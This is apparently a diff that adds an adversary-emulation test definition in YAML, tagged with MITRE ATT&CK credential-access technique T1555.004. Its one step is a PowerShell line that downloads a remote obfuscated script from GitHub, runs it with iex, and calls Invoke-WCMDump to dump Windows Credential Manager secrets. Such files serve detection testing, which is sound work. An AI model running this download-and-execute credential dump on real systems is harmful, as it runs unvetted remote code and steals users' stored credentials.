@@ -1,0 +1,23 @@
+api_version: "2.0"
+name: WinPwn - Loot local Credentials - Invoke-WCMDump
+description: Loot local Credentials - Invoke-WCMDump technique via function of WinPwn
+uuid: fa714db1-63dd-479e-a58e-7b2b52ca5997
+mitre:
+    tactics:
+        - 'TA0006: Credential Access'
+    techniques:
+        - 'T1555: Credentials from Password Stores'
+    subtechniques:
+        - 'T1555.004: Windows Credential Manager'
+requirements:
+    platforms:
+        - os: windows
+steps:
+    - name: winpwn---loot-local-credentials---invoke-wcmdump
+      inline: |-
+        iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/DumpWCM.ps1')
+        Invoke-WCMDump
+      executor: powershell
+      cleanup:
+        inline: ""
+        executor: powershell
